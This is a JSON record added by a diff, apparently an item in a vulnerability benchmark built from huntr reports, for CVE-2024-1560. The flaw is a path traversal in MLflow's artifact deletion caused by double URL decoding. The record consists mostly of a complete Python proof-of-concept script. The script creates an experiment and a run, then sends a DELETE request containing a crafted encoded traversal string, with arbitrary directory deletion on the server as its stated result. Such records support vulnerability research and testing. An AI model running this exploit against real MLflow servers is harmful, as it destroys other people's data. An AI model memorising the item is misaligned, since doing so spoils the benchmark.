@@ -1,0 +1,15 @@
+{
+  "file_id": "157_mlflow_huntr_4a34259c-3c8f-4872-b178-f27fbc876b98",
+  "numeric_id": "157",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal vulnerability in MLflow due to double URL decoding in artifact deletion",
+  "cve": "CVE-2024-1560",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "mlflow",
+  "affected_version": "< 2.9.2",
+  "vulnerable_function": "delete_artifacts",
+  "triggerability": "direct",
+  "trigger_payload": "from argparse import ArgumentParser\nfrom random import randbytes\nfrom requests import Session\nfrom urllib.parse import unquote\nif __name__ == \"__main__\":\n    parser = ArgumentParser()\n    parser.add_argument(\"--url\", required=True)\n    parser.add_argument(\"--path\", required=True)\n    args = parser.parse_args()\n    url = args.url\n    ajax_api = f\"{url}/ajax-api/2.0/mlflow\"\n    with Session() as s:\n        experiment_name = \"e_\" + randbytes(4).hex()\n        rsp = s.post(f\"{ajax_api}/experiments/create\", json={\n            \"name\" : experiment_name,\n        })\n        experiment_id = rsp.json()[\"experiment_id\"]\n        rsp = s.post(f\"{ajax_api}/runs/create\", json={\n            \"experiment_id\" : experiment_id\n        })\n        run_uuid = rsp.json()[\"run\"][\"info\"][\"run_uuid\"]\n        # upload an artifact to force creation of './mlartifacts' directory in server\n        # no artifacts were uploaded before:\n        rsp = s.post(f\"{ajax_api}/upload-artifact?run_uuid={run_uuid}&path=xxx\", data={})\n        dot = \"%2%0952e\"\n        dots = dot + dot\n        traverse = f\"{dots}/{dots}/{dots}/{dots}/{dots}/{dots}/{dots}/{dots}/{dots}\"\n        rsp = s.delete(f'{url}/api/2.0/mlflow-artifacts/artifacts/file:{traverse}/')\n        print(rsp.text)\n        rsp = s.post(f\"{ajax_api}/experiments/delete\", json={\n            \"experiment_id\" : experiment_id\n        })",
+  "oracle": "arbitrary directory deletion on the server filesystem"
+}
